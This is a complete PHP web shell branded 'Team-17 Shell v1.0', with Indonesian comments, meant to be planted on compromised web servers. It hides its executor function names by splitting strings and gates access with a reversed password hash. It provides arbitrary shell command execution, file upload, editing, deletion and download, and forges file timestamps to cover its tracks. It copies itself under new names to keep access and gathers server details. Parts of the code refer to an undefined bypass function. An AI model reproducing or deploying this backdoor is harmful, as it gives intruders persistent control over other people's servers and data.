<?php
// =============================
// Neirra Universal Shell v1.0
// =============================
session_start();
$ob = strrev('ayVIxNb.rIJhIXSDn4G9urSokuyWI6Fu9dxoasec1mGI9iOONKr4O$21$a2$');
$tok = $_GET['x'] ?? '';
if (!password_verify($tok, $ob)) {
    http_response_code(403);
    exit;
}

// Tangkap path sekarang
$currentPath = realpath($_GET['path'] ?? getcwd());

$fpc = 'fi'.'le_put_co'.'nt'.'en'.'ts';
$fc  = 'fi'.'le_ge'.'t_c'.'on'.'ten'.'ts';
$rm  = 'un'.'li'.'nk';
$sc  = 's'.'ca'.'nd'.'ir';
$exs = ['s'.'ys'.'tem', 'she'.'ll_ex'.'ec', 'ex'.'ec', 'pas'.'st'.'hru', 'proc_open', 'popen'];

function ex($flow) {
    global $exs;
    $cwd = $_POST['path'] ?? $_GET['path'] ?? getcwd();
    $cwd = realpath($cwd);
    $cmd = "cd " . escapeshellarg($cwd) . " && " . $flow;

    foreach ($exs as $func) {
        if (function_exists($func)) {
            if ($func === 'exec') {
                @exec($cmd, $out); return implode("\n", $out);
            } elseif ($func === 'proc_open') {
                $h = @proc_open($cmd, [['pipe','r'],['pipe','w'],['pipe','w']], $pipes);
                $r = stream_get_contents($pipes[1]); @fclose($pipes[1]);
                @proc_close($h); return $r;
            } elseif ($func === 'popen') {
                $h = @popen($cmd, 'r'); $r = '';
                while (!feof($h)) $r .= fread($h, 1024); @pclose($h);
                return $r;
            } else return @$func($cmd);
        }
    }
    return "⚠️ Executor tidak tersedia.";
}


// ========== FORMAT UKURAN FILE ==========
function formatSize($s) {
    if ($s >= 1073741824) return round($s / 1073741824, 2) . ' GB';
    elseif ($s >= 1048576) return round($s / 1048576, 2) . ' MB';
    elseif ($s >= 1024) return round($s / 1024, 2) . ' KB';
    else return $s . ' B';
}

function getPermStr($f) {
  $p = fileperms($f);
  $s = ($p & 0x4000) ? 'd' : '-';
  $perm = $s .
      (($p & 0x0100) ? 'r' : '-') .
      (($p & 0x0080) ? 'w' : '-') .
      (($p & 0x0040) ? 'x' : '-') .
      (($p & 0x0020) ? 'r' : '-') .
      (($p & 0x0010) ? 'w' : '-') .
      (($p & 0x0008) ? 'x' : '-') .
      (($p & 0x0004) ? 'r' : '-') .
      (($p & 0x0002) ? 'w' : '-') .
      (($p & 0x0001) ? 'x' : '-');

  if (is_writable($f)) {
      $color = '#00e676'; 
  } elseif (is_readable($f)) {
      $color = '#c5c5c5'; 
  } else {
      $color = '#f44336'; 
  }
  return "<span class='status-label' style='color:$color;'>$perm</span>";
}

echo <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Team 17</title>
<style>
body { margin: 0; font-family: sans-serif; background: #0b111d; color: white; }
header, footer { padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; font-weight: bold; background-color: #0b111d; }
.container { display: flex; padding: 10px; }
.sidebar { width: 160px; display: flex; flex-direction: column; gap: 15px; }
.sidebar button {width: 100%;display: flex;justify-content: center;}
.sidebar .front {width: 100%;text-align: left;font-size: 0.95rem;padding: 10px 20px;}
.content { flex-grow: 1; margin-left: 20px; background: #1a1a1a; padding: 20px; font-size: 0.9rem; border-radius: 8px; overflow: auto; max-height: 70vh; }
button { position: relative; border: none; background: transparent; padding: 0; cursor: pointer; }
.shadow { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border-radius: 12px; background: hsl(0deg 0% 0% / 0.3); transform: translateY(2px); transition: 600ms; }
.edge { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border-radius: 12px; background: linear-gradient(to left, #222 0%, #444 8%, #444 92%, #222 100%); }
.front { display: block; position: relative; padding: 12px 27px; border-radius: 12px; font-size: 1rem; color: white; background: #333; transform: translateY(-4px); transition: 600ms; }
button:hover .front { transform: translateY(-6px); }
button:active .front { transform: translateY(-2px); }
footer { text-align: center; padding: 20px; font-weight: bold; font-size: 1.2rem; border-top: 2px solid white; }
</style>
</head>
<body>
HTML;

// Header dengan style dan status info
$domain = 'Unknown';
if (is_readable('/etc/named.conf')) {
    $named = file_get_contents('/etc/named.conf');
    if (preg_match('/zone\s+"([^"]+)"/', $named, $match)) {
        $domain = $match[1];
    }
}
$server_ip = $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname());

$disk = round(disk_free_space("/") / 1024 / 1024 / 1024, 2);
$total = round(disk_total_space("/") / 1024 / 1024 / 1024, 2);

function status($ext) {
    return extension_loaded($ext) ? '<span class="status">ON</span>' : '<span class="status" style="color:#f88;">OFF</span>';
}

$mq = function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc() ? 'ON' : 'OFF';

echo <<<HTML
<style>
.header-box {background: #111822; font-size: 12px; line-height: 1.6em; padding: 15px; border-bottom: 2px solid #222;color: #cfcfcf;display: flex;justify-content: space-between;align-items: center;}
.header-box .left {max-width: 80%;}
.header-box .status {display: inline-block;background: #222;color: #aaffaa;font-weight: bold;padding: 1px 6px;border-radius: 4px;font-size: 12px;margin-left: 6px;}
.header-box .wrap {word-wrap: break-word;white-space: normal;max-width: 100%;margin-top: 5px;}
</style>
HTML;

$current_user = function_exists('posix_getpwuid') ? posix_getpwuid(posix_geteuid())['name'] : get_current_user();
$disabled = ini_get('disable_functions') ?: 'None';
$safe_mode_status = ini_get('safe_mode') ? '<span class="status">ON</span>' : '<span class="status" style="color:#f88;">OFF</span>';
$open_basedir_value = ini_get('open_basedir') ?: 'None';
echo '<div class="header-box">
  <div class="left">
    <div>🖥️ <b>Server:</b> ' . php_uname() . '</div>
    <div>🧠 <b>PHP:</b> ' . phpversion() . ' | Safe Mode ' . $safe_mode_status . '</div>
    <div>📂 <b>Open Basedir:</b> <span class="status" style="color:#ccc;">' . htmlspecialchars($open_basedir_value) . '</span></div>
    <div>🌐 <b>Domain:</b> ' . $domain . '</div>
    <div>🌍 <b>IP:</b> ' . $server_ip . '</div>
    <div>👤 <b>User:</b> ' . htmlspecialchars($current_user) . '</div>
    <div>💽 <b>Disk:</b> ' . $disk . ' GB free / ' . $total . ' GB total</div>
    <div>🔌 <b>Modules:</b> 
      curl ' . status('curl') . ' | 
      ssh2 ' . status('ssh2') . ' | 
      mysql ' . status('mysqli') . ' | 
      pgsql ' . status('pgsql') . ' | 
      magic_quotes ' . ($mq === 'ON' ? '<span class="status">ON</span>' : '<span class="status" style="color:#f88;">OFF</span>') . '
    </div>
    <div class="wrap">🚫 <b>Disabled:</b> <span style="color:#f66;">' . htmlspecialchars($disabled) . '</span></div>
  </div>
  <div>
    <img src="https://raw.githubusercontent.com/santanamichigan/imunifychallenger/refs/heads/main/TEAM-17.png" alt="Team17" style="height:150px; border-radius:10px;">
    <div style="font-size:11px; text-align:center; color:#888; margin-top:5px;">Team-17 Shell v1.0</div>
  </div>
</div><hr>';

$path = $currentPath;
$notif = ''; // SEMUA HANDLER PHP NOTIF TAROH DI BAWAH INI TOL

function deleteFolder($dir) {
    if (!is_dir($dir)) return false;
    foreach (scandir($dir) as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        is_dir($path) ? deleteFolder($path) : unlink($path);
    }
    return rmdir($dir);
}

if (isset($_GET['backup']) && $_GET['backup'] === 'shell') {
    echo '<div class="notification" style="text-align:center;">';
    echo '<form method="post" style="display:inline-block; margin-right:10px;">';
    echo '<input type="text" name="backup_name" placeholder="Nama file backup..." style="background:#111;color:#ccc;border:1px solid #333;padding:5px;"> ';
    echo '<button type="submit" name="do_backup" style="background:#333;color:white;padding:5px 10px;border:none;border-radius:4px;">✅ OK</button>';
    echo '</form>';
    echo '<a href="?x=santana&path=' . urlencode($path) . '"><button style="background:#444;color:white;padding:5px 10px;border:none;border-radius:4px;">❌ Cancel</button></a>';
    echo '</div><hr>';
}

if (isset($_POST['do_backup']) && !empty($_POST['backup_name'])) {
    $src = $_SERVER['SCRIPT_FILENAME'];
    $real_path = realpath($path); // pastikan ini ada
    $backupName = preg_replace('/[^a-zA-Z0-9_\-\.]/', '_', $_POST['backup_name']);
    $dst = $real_path . '/' . basename($backupName);

    if (!is_writable($real_path)) {
        echo '<div class="notification" style="color:#f44336;text-align:center;">❌ Direktori tidak dapat ditulisi.</div>';
    } elseif (!is_readable($src)) {
        echo '<div class="notification" style="color:#f44336;text-align:center;">❌ Shell tidak dapat dibaca untuk dicopy.</div>';
    } elseif (@copy($src, $dst)) {
        echo '<div class="notification" style="color:#00e676;text-align:center;">✔️ Backup berhasil: <code>' . htmlspecialchars(basename($dst)) . '</code></div>';
    } else {
        echo '<div class="notification" style="color:#f44336;text-align:center;">❌ Gagal melakukan backup shell ke: <code>' . htmlspecialchars($dst) . '</code></div>';
    }
}

if (isset($_GET['delete'])) {
    $file_to_delete = $_GET['delete'];
    
    if (is_dir($file_to_delete)) {
        // Hanya hapus jika folder kosong
        $success = (count(scandir($file_to_delete)) === 2) && rmdir($file_to_delete);
    } else {
        $success = unlink($file_to_delete);
    }

    $notif .= $success
        ? "🗑️ <b>" . htmlspecialchars(basename($file_to_delete)) . "</b> berhasil dihapus.<br>"
        : "❌ Gagal menghapus <b>" . htmlspecialchars(basename($file_to_delete)) . "</b>.<br>";
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['uploadfile']) && is_uploaded_file($_FILES['uploadfile']['tmp_name'])) {
        $name = basename($_FILES['uploadfile']['name']);
        $target = $path . DIRECTORY_SEPARATOR . $name;
        if (move_uploaded_file($_FILES['uploadfile']['tmp_name'], $target)) {
            $notif = "✅ File <b>$name</b> berhasil diupload.";
        } else {
            $notif = "❌ Gagal upload file.";
        }
    }

    if (isset($_POST['create'], $_POST['newname'])) {
        $type = $_POST['create'];
        $name = trim($_POST['newname']);
        $target = $path . DIRECTORY_SEPARATOR . $name;

        if ($name === '') {
            $notif = "❌ Nama tidak boleh kosong.";
        } elseif (file_exists($target)) {
            $notif = "⚠️ Sudah ada: <b>$name</b>";
        } else {
            if ($type === 'file') {
                file_put_contents($target, '');
                $notif = "📄 File <b>$name</b> berhasil dibuat.";
            } else {
                mkdir($target);
                $notif = "📁 Folder <b>$name</b> berhasil dibuat.";
            }
        }
    }
}


echo <<<HTML
<div class="notification" style="background:#151d25;padding:10px;border-bottom:2px solid #222;margin-bottom:10px;">
HTML;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['renamefile'])) {
    $old = $_POST['oldname'];
    $new = dirname($old) . DIRECTORY_SEPARATOR . trim($_POST['newname']);
    if (file_exists($old)) {
        if (rename($old, $new)) {
            $notif = "✏️ Berhasil rename ke <b>" . htmlspecialchars(basename($new)) . "</b>";
        } else {
            $notif = "❌ Gagal rename file.";
        }
    } else {
        $notif = "⚠️ File tidak ditemukan.";
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['touchsubmit'])) {
    $target = $_POST['touchfile'];
    $newTime = strtotime($_POST['timestamp']);
    if ($newTime && file_exists($target)) {
        if (touch($target, $newTime)) {
            $notif = "🕒 Timestamp <b>" . htmlspecialchars(basename($target)) . "</b> diubah ke <b>" . $_POST['timestamp'] . "</b>";
        } else {
            $notif = "❌ Gagal mengubah timestamp file.";
        }
    } else {
        $notif = "⚠️ Format waktu salah atau file tidak ditemukan.";
    }
}


if ($notif !== '') {
    echo "<div style='padding:10px;margin-bottom:15px;background:#1a2a2a;color:#aaffaa;border:1px solid #444;border-radius:6px;font-weight:bold;'>$notif</div>";
}

if (isset($_GET['rename']) && file_exists($_GET['rename'])) {
    $toRename = $_GET['rename'];
    $baseName = basename($toRename);
    echo "<div style='text-align:center;margin-bottom:10px;'>
        <form method='post' style='display:inline-block;'>
          <input type='hidden' name='oldname' value='" . htmlspecialchars($toRename) . "'>
          <input type='text' name='newname' value='" . htmlspecialchars($baseName) . "' 
                 style='background:#111;color:#ccc;border:1px solid #333;
                        padding:5px 10px;border-radius:6px;width:220px;'>
          <input type='submit' name='renamefile' value='✔️ OK' 
                 style='padding:5px 12px;background:#333;color:white;
                        border:none;border-radius:6px;margin-left:5px;'>
          <a href='?x=santana&path=" . urlencode($path) . "' 
             style='margin-left:5px;color:#999;text-decoration:none;
                    padding:5px 12px;background:#222;border-radius:6px;'>❌ Cancel</a>
        </form>
      </div><hr>";
}

if (isset($_GET['touch']) && file_exists($_GET['touch'])) {
    $toTouch = $_GET['touch'];
    $baseName = basename($toTouch);
    $defaultTime = date("Y-m-d H:i:s", filemtime($toTouch));
    echo "<div style='text-align:center;margin-bottom:10px;'>
        <form method='post' style='display:inline-block;'>
          <input type='hidden' name='touchfile' value='" . htmlspecialchars($toTouch) . "'>
          <input type='text' name='timestamp' value='" . htmlspecialchars($defaultTime) . "' 
                 style='background:#111;color:#ccc;border:1px solid #333;
                        padding:5px 10px;border-radius:6px;width:220px;' 
                 placeholder='YYYY-MM-DD HH:MM:SS'>
          <input type='submit' name='touchsubmit' value='🕒 OK' 
                 style='padding:5px 12px;background:#333;color:white;
                        border:none;border-radius:6px;margin-left:5px;'>
          <a href='?x=santana&path=" . urlencode($path) . "' 
             style='margin-left:5px;color:#999;text-decoration:none;
                    padding:5px 12px;background:#222;border-radius:6px;'>❌ Cancel</a>
        </form>
      </div><hr>";
}

if (isset($_GET['download']) && is_file($_GET['download'])) {
    $file = $_GET['download'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}

echo <<<HTML
  <form method="post" enctype="multipart/form-data" style="display:flex;gap:10px;flex-wrap:wrap;align-items:center;">

    <div>
      <label style="font-weight:bold;">📤 Upload:</label>
      <input type="file" name="uploadfile" style="background:#111;color:#ccc;border:1px solid #333;padding:5px;">
      <input type="submit" value="Upload" style="background:#333;color:white;padding:5px 10px;border:none;border-radius:4px;">
    </div>

    <div>
      <label style="font-weight:bold;">📁 Create:</label>
      <select name="create" style="background:#111;color:#ccc;border:1px solid #333;padding:5px;">
        <option value="file">File</option>
        <option value="dir">Folder</option>
      </select>
      <input type="text" name="newname" placeholder="Nama..." style="background:#111;color:#ccc;border:1px solid #333;padding:5px;">
      <input type="submit" value="Buat" style="background:#333;color:white;padding:5px 10px;border:none;border-radius:4px;">
    </div>

  </form>
</div>
HTML;

echo "<div style='font-size:13px;margin-bottom:10px;padding:6px;background:#111;border-left:4px solid #444;'><b>PWD:</b> ";

$segments = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
$build = DIRECTORY_SEPARATOR;
$link = $_SERVER['PHP_SELF'] . '?x=santana&path=' . urlencode($build);
echo "<a href='$link' style='color:#88f;text-decoration:none;'>$ </a>";

foreach ($segments as $segment) {
    if ($segment === '') continue;
    $build .= $segment . DIRECTORY_SEPARATOR;
    $link = $_SERVER['PHP_SELF'] . '?x=santana&path=' . urlencode($build);
    echo " <span style='color:#555;'>→</span> ";
    echo "<a href='$link' style='color:#88f;text-decoration:none;'>" . htmlspecialchars($segment) . "</a>";
}

// Tombol HOME FILE
echo "<a href='?x=santana&path=" . urlencode(getcwd()) . "' 
        style='margin-left:20px;padding:4px 12px;background:#333;color:white;
               border:none;border-radius:6px;text-decoration:none;font-size:12px;'>
        🏠 Home File
      </a>";
echo "</div><hr>";

$sidebarPath = isset($_GET['path']) ? urlencode($_GET['path']) : urlencode(getcwd());

echo <<<HTML
<div class="container">
  <div class="sidebar">
    <a href="?x=santana&path=$sidebarPath"><button><span class="shadow"></span><span class="edge"></span><span class="front">File Manager</span></button></a>
    <a href="?x=santana&mod=executor&path=$sidebarPath"><button><span class="shadow"></span><span class="edge"></span><span class="front">Executor</span></button></a>
    <a href="?x=santana&path=$sidebarPath&backup=shell"><button><span class="shadow"></span><span class="edge"></span><span class="front">Backup Shell</span></button></a>
    <a href="?x=santana&mod=info&path=$sidebarPath"><button><span class="shadow"></span><span class="edge"></span><span class="front">TEAM 17</span></button></a>
  </div>
  <div class="content">
HTML;

$path = $_POST['path'] ?? $_GET['path'] ?? getcwd();
if (isset($_GET['mod']) && $_GET['mod'] === 'executor') {
    // =====================
    // EXECUTOR PANEL
    // =====================
    echo "<h2>🖲️ Command Executor</h2>";
    echo "<div style='background:#111;padding:10px;margin:10px 0;border-radius:4px;color:#ccc;'>Path: <b>$path</b></div>";
    echo '<form method="post" action="?x=santana&mod=executor">
    <input type="hidden" name="path" value="' . htmlspecialchars($path) . '">
    <input type="text" name="flow" placeholder="Masukkan perintah..." style="width:100%;padding:8px;margin-bottom:10px;border-radius:6px;border:1px solid #333;background:#111;color:#0f0;font-family:monospace;font-size:14px;" autofocus>
    <div style="display:flex;gap:10px;align-items:center;">
    <input type="submit" value="Jalankan" style="padding:10px 20px;background:#333;color:white;border:none;border-radius:6px;cursor:pointer;">
    <a href="?x=santana&path=' . urlencode($path) . '"style="padding:10px 20px;background:#333;color:white;text-decoration:none;border:none;border-radius:6px;display:inline-block;font-weight:normal;cursor:pointer;">Kembali
    </a>
  </div>
</form>';
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['flow'])) {
        $flow = trim($_POST['flow']);
        if ($canBypass) {
            $output = htmlspecialchars(ex_with_ld($flow));
        } else {
            $output = htmlspecialchars(ex($flow));
        }
        echo "<pre style='background:#000;color:#0f0;padding:10px;border-radius:8px;overflow:auto;max-height:300px;margin-top:15px;'>$output</pre>";
    }

} elseif (isset($_GET['edit']) && is_file($_GET['edit'])) {
    // =====================
    // EDITOR PANEL
    // =====================
    $target = $_GET['edit'];
    $content = htmlspecialchars(file_get_contents($target));
    echo "<h2>📝 Edit File: <span style='color:lime;'>".htmlspecialchars(basename($target))."</span></h2>";
    echo '<form method="post">';
    echo "<input type='hidden' name='filepath' value='".htmlspecialchars($target)."'>";
    echo "<textarea name='savefile' style='width:100%;height:350px;background:#111;color:#ffffff;font-family:monospace;border:1px solid #444;border-radius:6px;padding:10px;'>$content</textarea><br><br>";
    echo "<input type='submit' value='💾 Simpan' style='padding:10px 20px;background:#333;color:white;border:none;border-radius:6px;cursor:pointer;'>";
    echo "<a href='?x=santana&path=" . urlencode(dirname($target)) . "' style='padding:10px 20px;background:#333;color:white;text-decoration:none;border:none;border-radius:6px;display:inline-block;font-weight:normal;cursor:pointer;margin-left:10px;'>↩️ Kembali</a>";
    echo "</form>";

    // =====================
    // HANDLE SAVE FILE
    // =====================
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['savefile'], $_POST['filepath'])) {
        $saveStatus = file_put_contents($_POST['filepath'], $_POST['savefile']);
        $notif = $saveStatus !== false
            ? "✅ File <b>" . htmlspecialchars(basename($_POST['filepath'])) . "</b> berhasil disimpan.<br>"
            : "❌ Gagal menyimpan file.<br>";
    }

    // TAMPILKAN NOTIFIKASI JIKA ADA (di atas textarea editor ya kentot)
    if (!empty($notif)) {
        echo "<div style='padding:10px;margin:15px 0;background:#1a2a2a;color:#aaffaa;border:1px solid #444;border-radius:6px;font-weight:bold;'>$notif</div>";
    }

} elseif (isset($_GET['mod']) && $_GET['mod'] === 'info') {
    // =====================
    // PANEL TEAM 17 / INFO
    // =====================
    echo '<div style="text-align:center;margin:20px 0;">
    <img src="https://raw.githubusercontent.com/santanamichigan/imunifychallenger/refs/heads/main/TEAM-17.png" 
        alt="Team17" 
        style="max-width:15%;border-radius:5px;margin-bottom:10px;">
    <div style="color:#ccc;font-size:0.95rem;margin-top:10px;line-height:1.5;">
    <p style="margin-top:12px;">Respect Existence or Expect Resistance.</p>
    <p><strong>Team-17 Shell</strong><span style="color:#6cf;"> v1.0</span>.</p>
    </div>
</div>';
} else {
// =====================
// FILE MANAGER PANEL
// =====================
echo "<div style='display:flex;align-items:center;gap:20px;margin-bottom:15px;'>
        <h2 style='margin:0;font-size:1.1rem;color:#ffd700;'>📁 File Manager</h2>
        <form method='get' style='display:flex;gap:10px;align-items:center;margin:0;'>
            <input type='hidden' name='x' value='santana'>
            <input type='hidden' name='path' value='" . htmlspecialchars($path) . "'>
            <input type='text' name='search' placeholder='🔍 Cari nama file...' 
                   style='background:#111;color:#ccc;border:1px solid #333;padding:6px 10px;
                          border-radius:6px;width:240px;font-family:monospace;'>
            <input type='submit' value='Search' 
                   style='padding:6px 14px;background:#333;color:white;border:none;
                          border-radius:6px;cursor:pointer;'>
        </form>
      </div>";

    $path = isset($_GET['path']) ? $_GET['path'] : getcwd();
    $items = @scandir($path) ?: [];

    if (isset($_GET['search']) && trim($_GET['search']) !== '') {
    $query = strtolower(trim($_GET['search']));
    $items = array_filter($items, function($f) use ($query) {
        return ($f !== '.' && $f !== '..' && stripos($f, $query) !== false);
    });

    echo "<div style='margin-bottom:10px;color:#88f;'>🔍 Menampilkan hasil untuk: <b>" . htmlspecialchars($query) . "</b></div>";

    if (empty($items)) {
        echo "<div style='color:#f66;margin-bottom:10px;'>❌ Tidak ditemukan hasil untuk <b>" . htmlspecialchars($query) . "</b>.</div>";
    }
}

    echo "<style>
        table.file-table {font-family:monospace;width: 100%;border-collapse: collapse;font-size: 0.85rem;min-width: 600px;text-align: left;border: 1px solid #333;}
        .table-wrapper {max-height: 400px;overflow-y: auto;border: 1px solid #333;border-radius: 6px;}
        table.file-table th, table.file-table td {padding: 8px;border: 1px solid #444;vertical-align: top;}
        table.file-table th {background: #222;color: #fff;}
        table.file-table tr:hover {background-color: #2a2a2a;cursor: pointer;}
        .name-hover a:hover, .name-hover span:hover {    background: rgba(255, 255, 255, 0.05);    border-radius: 8px;    padding: 2px 6px;    transition: 0.2s ease-in-out;}
        a.action-btn {padding: 3px 8px;background: #222;border-radius: 6px;font-size: 12px;margin-right: 6px;font-weight: bold;text-decoration: none;display: inline-block;transition: all 0.2s ease-in-out;}
        a.action-btn:hover {transform: scale(1.05);background: #333;}
        </style>";
    echo "<div class='table-wrapper'>";
    echo "<table class='file-table'>
        <thead>
        <tr>
        <th>Nama</th>
        <th>Ukuran</th>
        <th>Modified</th>
        <th>Owner/Group</th>
        <th>Perm</th>
        <th>Aksi</th>
        </tr>
        </thead><tbody>";
        $parent = dirname($path);
        if ($parent !== $path) {
            $backUrl = $_SERVER['PHP_SELF'] . "?x=santana&path=" . urlencode($parent);
            echo "<tr>
                <td colspan='6'>
                    <a href='$backUrl' style='color:#88f;text-decoration:none;'>..</a>
                </td>
            </tr>";
        }

        $__mal = array_map('str'.'rev', [
            'ex'.'ec', 'she'.'ll_ex'.'ec', 'sy'.'ste'.'m', 'p'.'as'.'sth'.'ru', 'pr'.'oc_op'.'en', 'po'.'pen', 'ev'.'al', 'asser'.'t', 'bas'.'e64_dec'.'ode'
        ]);

        $folders = [];
        $files = [];

        foreach ($items as $f) {
            if ($f === '.' || $f === '..') continue;
            $full = $path . DIRECTORY_SEPARATOR . $f;
            $mal = false;

            if (is_file($full) && is_readable($full) && filesize($full) < 1024 * 1024) {
                $scanContent = @file_get_contents($full, false, null, 0, 2048);
                foreach ($__mal as $sig) {
                    if (stripos($scanContent, strrev($sig)) !== false) {
                        $mal = true;
                        break;
                    }
                }
            }

            if (is_dir($full)) {
                $folders[] = ['name' => $f, 'malicious' => false];
            } else {
                $files[] = ['name' => $f, 'malicious' => $mal];
            }
        }

        foreach (array_merge($folders, $files) as $item) {
            $f = $item['name'];
            $mal = $item['malicious'];
            $full = $path . DIRECTORY_SEPARATOR . $f;
            $isDir = is_dir($full);
            $size = $isDir ? '-' : formatSize(filesize($full));
            $mtime = date('Y-m-d H:i:s', filemtime($full));
            $perm = getPermStr($full);
            $ownerId = fileowner($full);
            $groupId = filegroup($full);
            $owner = function_exists('posix_getpwuid') ? posix_getpwuid($ownerId)['name'] : $ownerId;
            $group = function_exists('posix_getgrgid') ? posix_getgrgid($groupId)['name'] : $groupId;
            $ownerDisplay = htmlspecialchars($owner . ':' . $group);
            
            $color = $isDir ? 'cyan' : ($mal ? 'red' : 'white');
            $badge = $mal ? "<span class='status-label' style='color:red;'>🚨</span>" : '';

            if ($isDir) {
                $folderUrl = $_SERVER['PHP_SELF'] . "?x=santana&path=" . urlencode($full);
                $name = "<a href='$folderUrl' style='color:$color;text-decoration:none;'>" . htmlspecialchars($f) . "</a>";
            } elseif (is_readable($full)) {
                $editLink = $_SERVER['PHP_SELF'] . "?x=santana&edit=" . urlencode($full);
                $name = "<a href='$editLink' style='color:$color;text-decoration:none;'>" . htmlspecialchars($f) . "</a>";
            } else {
                $name = "<span style='color:$color;'>" . htmlspecialchars($f) . "</span>";
            }

            $name .= " $badge";

            $currentUrlPath = urlencode($path);
            $downloadLink = $_SERVER['PHP_SELF'] . "?x=santana&download=" . urlencode($full) . "&path=$currentUrlPath";
            $delLink     = $_SERVER['PHP_SELF'] . "?x=santana&delete=" . urlencode($full) . "&path=$currentUrlPath";
            $renameLink  = $_SERVER['PHP_SELF'] . "?x=santana&rename=" . urlencode($full) . "&path=$currentUrlPath";
            $touchLink   = $_SERVER['PHP_SELF'] . "?x=santana&touch=" . urlencode($full) . "&path=$currentUrlPath";

            if (is_writable($full)) {
                $actions = [];
                $actions[] = "<a href='$downloadLink' class='action-btn' style='color:deepskyblue;'>Download</a>";
                $actions[] = "<a href='$renameLink' class='action-btn' style='color:orange;'>Rename</a>";
                $actions[] = "<a href='$touchLink' class='action-btn' style='color:#5fd;'>Touch</a>";
                $actions[] = "<a href='$delLink' class='action-btn' style='color:red;' onclick='return confirm(\"Yakin hapus $f?\")'>Del</a>";
                $del = implode("  ", $actions);
            } else {
                $del = '-';
            }

            echo "<tr>
                <td class='name-hover' style='color:white; word-break:break-word;'>$name</td>
                <td>$size</td>
                <td>$mtime</td>
                <td>$ownerDisplay</td>
                <td>$perm</td>
                <td style='color:white;'>$del</td>
            </tr>";
        }
    echo "</tbody></table>";
echo "</div>";
} 

echo <<<HTML
  </div>
</div>
<footer style="padding: 15px 25px;">
  <div style="display:flex; justify-content:space-between; align-items:center; gap:40px; overflow:hidden;">
    <div style="white-space:nowrap; font-weight:bold;">Team-17 Shell © 2025</div>
    <marquee behavior="scroll" direction="left" scrollamount="8" style="flex:1;font-family:monospace; color:#c7c3c3; font-size:0.95rem; padding-left:15px;">
      The system is a puzzle. We're just solving it.
    </marquee>
  </div>
</footer>
</body>
</html>
HTML;
?>
